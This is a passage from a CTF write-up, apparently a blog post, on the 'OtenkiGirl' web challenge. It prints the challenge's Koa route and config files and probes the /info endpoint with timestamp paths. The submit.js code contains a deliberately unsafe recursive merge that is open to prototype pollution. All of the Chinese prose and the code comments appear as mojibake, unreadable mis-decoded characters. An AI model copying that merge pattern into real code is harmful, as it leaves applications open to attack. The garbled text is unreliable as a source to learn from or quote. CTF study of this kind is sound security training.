<h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>è¯¥é¢˜æä¾›äº†ç½‘é¡µçš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥ä»ç½‘é¡µçš„æºç ä¸­è¿›è¡Œåˆ†æ:<br><img src="/images/2023-11-3-newstar-3/image-20231028152657729.png" srcset="/img/loading.gif" lazyload alt="image-20231028152657729"></p>
<p>æºç ä¸­å­˜åœ¨è·¯ç”±æ–‡ä»¶å¤¹ï¼Œå…ˆæŸ¥çœ‹ç½‘é¡µçš„å…·ä½“è¿è¡Œé€»è¾‘æ˜¯ä»€ä¹ˆï¼Œå³ä»ç½‘é¡µçš„è·¯ç”±å¼€å§‹åˆ†æ:</p>
<p>submit.js:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Base58</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;base-58&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALPHABET</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndText</span> = (<span class="hljs-params">length</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(&#123; length &#125;, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable constant_">ALPHABET</span>[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable constant_">ALPHABET</span>.<span class="hljs-property">length</span>)]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">timeText</span> = (<span class="hljs-params">timestamp</span>) =&gt; &#123;<br>    timestamp = (<span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">let</span> text1 = timestamp.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">let</span> text2 = timestamp.<span class="hljs-title function_">substring</span>(timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">let</span> text = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; text1.<span class="hljs-property">length</span>; i++)<br>        text += text1[i] + text2[text2.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i];<br>    <span class="hljs-keyword">if</span> (text2.<span class="hljs-property">length</span> &gt; text1.<span class="hljs-property">length</span>) text += text2[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Base58</span>.<span class="hljs-title function_">encode</span>(<span class="hljs-title function_">rndText</span>(<span class="hljs-number">3</span>) + <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(text)); <span class="hljs-comment">// length = 20</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndID</span> = (<span class="hljs-params">length, timestamp</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">timeText</span>(timestamp);<br>    <span class="hljs-keyword">if</span> (length &lt; t.<span class="hljs-property">length</span>) <span class="hljs-keyword">return</span> t.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, length);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> t + <span class="hljs-title function_">rndText</span>(length - t.<span class="hljs-property">length</span>);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-keyword">let</span> date = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;date&quot;</span>]),<br>        place = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;place&quot;</span>]),<br>        contact = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;contact&quot;</span>]),<br>        reason = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;reason&quot;</span>]);<br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-keyword">const</span> wishid = <span class="hljs-title function_">rndID</span>(<span class="hljs-number">24</span>, timestamp);<br>    <span class="hljs-comment">//å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ’å…¥æ•°æ®åº“ä¸­</span><br>    <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">run</span>(<span class="hljs-string">`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`</span>, [wishid, date, place, contact, reason, timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-comment">//åœ¨jsä¸­å¦‚æœå¯¹è±¡æ—¶jsonç±»å‹å³const data=&#123;&#125;,åˆ™è¯¥dataå¯¹è±¡çš„ç±»å‹å°±ä¸ºobjectï¼Œå¦åˆ™å°±ä¸æ˜¯ï¼Œè¿”å›dstæ‰€ä»£è¡¨çš„å€¼</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//è·å–srcä¸­çš„é”®</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//å¦‚æœé”®å­˜åœ¨äºä¸¤ä¸ªå¯¹è±¡ä¸­åˆ™è¿›è¡Œåˆå¹¶</span><br>            <span class="hljs-comment">//å°†ä¸¤ä¸ªå¯¹è±¡æ‰€å¯¹åº”çš„keyçš„valueè¿›è¡Œåˆå¹¶ï¼Œè¿”å›ç»™dstå¯¹è±¡</span><br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//å¦‚æœdstå¯¹è±¡ä¸­ä¸å­˜åœ¨è¯¥é”®å€¼ï¼Œåˆ™æ·»åŠ ä¸Šè¯¥é”®å€¼</span><br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æ‰€ä»¥æœ€ç»ˆè¯¥ä»£ç æ·»åŠ ä¸Šdstä¸­æ²¡æœ‰srcä¸­æœ‰çš„é”®å€¼å†…å®¹ç»™dst,ä¿æŒä¸¤è€…éƒ½æœ‰çš„å†…å®¹åœ¨dstä¸­ä¸å˜</span><br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><br><span class="hljs-comment">//ç½‘é¡µä»¥postè¯·æ±‚çš„æ–¹å¼è®¿é—®/submitåœ°å€æ—¶,atxå­˜å‚¨äº†è¯·æ±‚å’Œå“åº”çš„ä¿¡æ¯</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/submit&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­ï¼Œä¼ è¾“ç±»å‹æ˜¯å¦æ˜¯application/json</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/json&quot;</span>)<br>    <span class="hljs-comment">//è¿”å›ä¸€ä¸ªä»¥jsonæ•°æ®ä¸ºæ ¼å¼çš„å“åº”å†…å®¹</span><br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/json&quot;</span><br>        &#125;<br>        <span class="hljs-comment">//è·å–è¯·æ±‚ä½“ä¸­çš„jsonä¸»ä½“å†…å®¹</span><br>    <span class="hljs-keyword">const</span> jsonText = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">rawBody</span> || <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//å°†è·å–çš„æ•°æ®è½¬åŒ–ä¸ºjsæ‰€å¯ä»¥ä½¿ç”¨çš„jsonæ•°æ®ï¼Œå¯ä»¥ç†è§£ä¸ºè½¬åŒ–ä¸ºå­—å…¸ç±»å‹çš„æ•°æ®</span><br>        <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonText);<br>        <span class="hljs-comment">//åˆ¤æ–­jsonæ•°æ®dataä¸­contactå¥æ‰€å¯¹åº”çš„valueçš„ç±»å‹ä»¥åŠreasonæ‰€å¯¹åº”å¾—ç±»å‹æ˜¯ä¸æ˜¯ä¸ºstring(å­—ç¬¦ä¸²)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;contact&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;reason&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span>)<br>        <span class="hljs-comment">//å¦‚æœå…¶ä¸­æœ‰ä¸€ä¸ªä¼ è¾“ç±»å‹ä¸æ˜¯å­—ç¬¦ä¸²å°±è¾“å‡ºé”™è¯¯çš„å“åº”åŒ…</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//åˆ¤æ–­dataä¸­contactå’Œreasonæ‰€å¯¹åº”çš„å†…å®¹çš„å€¼æ˜¯å¦ä¸ºç©º</span><br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-string">&quot;contact&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span> || data[<span class="hljs-string">&quot;reason&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-comment">//å¦‚æœä¸¤è€…æ‰€å¯¹åº”å¾—å†…å®¹ä¸ºç©ºï¼Œåˆ™è¿”å›é”™è¯¯å¾—å“åº”å†…å®¹ä¸»ä½“</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Parameters contact and reason cannot be empty&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT</span> = &#123;<br>                <span class="hljs-attr">date</span>: <span class="hljs-string">&quot;unknown&quot;</span>,<br>                <span class="hljs-attr">place</span>: <span class="hljs-string">&quot;unknown&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//è°ƒç”¨insert2dbå‡½æ•°å°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: result<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure>

<p>info.js:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-comment">//å¼•ç”¨é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä½¿å½“å‰ä»£ç è·å–å¼•ç”¨æ–‡ä»¶ä¸­çš„ä¿¡æ¯</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<br>    <span class="hljs-comment">//å¦‚æœtimestampç±»å‹ä¸ºnumberå‹ï¼ˆæ•°å€¼å‹ï¼‰ï¼Œåˆ™è¿”å›timestampçš„å€¼ï¼Œå¦åˆ™å°±ä¸ºå½“å‰æ—¶é—´çš„å€¼</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-comment">//è·å–æ—¶é—´æˆ³ä¿¡æ¯ï¼Œå¦‚æœCONFIG.min_public_timeçš„æ—¶é—´ä¸ºçœŸåˆ™ä»¥å®ƒä½œä¸ºå¯¹è±¡ç”³è¯·æ—¶çš„å‚æ•°</span><br>    <span class="hljs-comment">//å¦åˆ™å°±ä»¥DEFAULT_CONFIG.min_public_timeä½œä¸ºæ—¶é—´å¯¹è±¡çš„å‚æ•°ï¼Œgettime()è·å–dateç±»çš„æ—¶é—´æˆ³</span><br>    <span class="hljs-comment">//è¿™é‡Œçš„CONFIGï¼ŒDEFAULT_CONFIGéƒ½å±äºå¼•ç”¨æ–‡ä»¶ï¼Œæ‰€ä»¥è·å–çš„æ˜¯å¼•ç”¨çš„é…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br>    <span class="hljs-comment">//timestampè·å–timestampå’ŒminTimestampä¸­æœ€å¤§çš„é‚£ä¸€ä¸ªæ—¶é—´æˆ³çš„å€¼</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br>    <span class="hljs-comment">//è·å–æ•°æ®åº“ä¸­æ—¶é—´æˆ³å¤§äºtimestampçš„è®°å½•å†…å®¹</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><span class="hljs-comment">//ä½¿ç”¨postè¯·æ±‚è®¿é—®/infoç½‘é¡µï¼Œ:è¡¨ç¤ºè®¿é—®è¯¥ç½‘é¡µæ—¶è·å–å‚æ•°å†…å®¹,tsä¸ºå‚æ•°éƒ¨åˆ†ï¼Œ?è¡¨ç¤ºè¯¥å‚æ•°å¯ä»¥å¡«å†™ä¹Ÿå¯ä»¥ä¸å¡«å†™</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­è¯·æ±‚å†…å®¹å¾—ç±»å‹æ˜¯ä¸æ˜¯application/x-www-form-urlencoded</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//è·å–è¯·æ±‚å†…å®¹ä¸­çš„å‚æ•°é›†ä¸­çš„å‚æ•°tsçš„å€¼çš„ç±»å‹</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>)<br>        ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span> <span class="hljs-comment">//tså‚æ•°é»˜è®¤æ˜¯0</span><br>        <span class="hljs-comment">// /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;):å…ˆè¿è¡Œtest()ä¸­çš„å†…å®¹ï¼Œå¦‚æœtsä¸ºç©ºåˆ™è¢«èµ‹å€¼ä¸º&quot;&quot;,åŒæ—¶åˆ¤æ–­æ˜¯å¦ç”±æ•°å­—ç»„æˆ</span><br>        <span class="hljs-comment">//å¦‚æœç”±æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²åˆ™è¿”å›Number(ctx.params.ts)ï¼Œå°†tsè½¬åŒ–ä¸ºæ•°å€¼å‹çš„ç»“æœ</span><br>        <span class="hljs-comment">//å¦‚æœä¸æ˜¯ç”±æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›åŸæ¥tsçš„å†…å®¹</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-comment">//å¦‚æœtimestampç±»å‹ä¸ä¸ºæ•°å€¼å‹</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-comment">//dataä¸ºä»æ•°æ®åº“ä¸­è¿”å›çš„æ‰€æœ‰è®°å½•æ•°å†…å®¹</span><br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure>

<p>æ ¹æ®info.jsçš„ä»£ç å®¡è®¡æˆ‘ä»¬éœ€è¦æŸ¥çœ‹config.jsæ–‡ä»¶å’Œconfig.default.jsæ–‡ä»¶ä¸­çš„æœ€å°æ—¶é—´ä¿¡æ¯:</p>
<p>config.js:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure>

<p>config.default.js:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-comment">//è®¾ç½®äº†min_public_timeå‚æ•°çš„å†…å®¹</span><br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>å‘ç°åªæœ‰config.default.jsè®¾ç½®äº†min_public_timeå‚æ•°çš„å†…å®¹ï¼Œæ‰€ä»¥dateç±»ç”³è¯·æ—¶ä½¿ç”¨äº†config.default.jsä¸­çš„min_public_time: â€œ2019-07-09â€</p>
<p>åŒæ—¶æ ¹æ®åˆ†æinfo.jsæˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„å‚æ•°tså¯ä»¥æ—¶ä»»æ„çš„ï¼Œç”¨äºè·å–æŒ‡å®šæ—¶é—´æˆ³çš„ä¿¡æ¯:</p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231028170204727.png" srcset="/img/loading.gif" lazyload alt="image-20231028170204727"></p>
<p>æˆ‘ä»¬å‘ç°è¿”å›çš„å†…å®¹æ˜¯æ—¶é—´æˆ³â€timestampâ€:1698483502171çš„å†…å®¹ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ—¶é—´æˆ³ts&#x3D;1&lt;1698483502171ï¼ˆmin_public_time: â€œ2019-07-09â€ï¼‰æ‰€ä»¥è¿”å›çš„æ˜¯ç³»ç»Ÿé»˜è®¤æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯</p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1698483502172<br></code></pre></td></tr></table></figure>

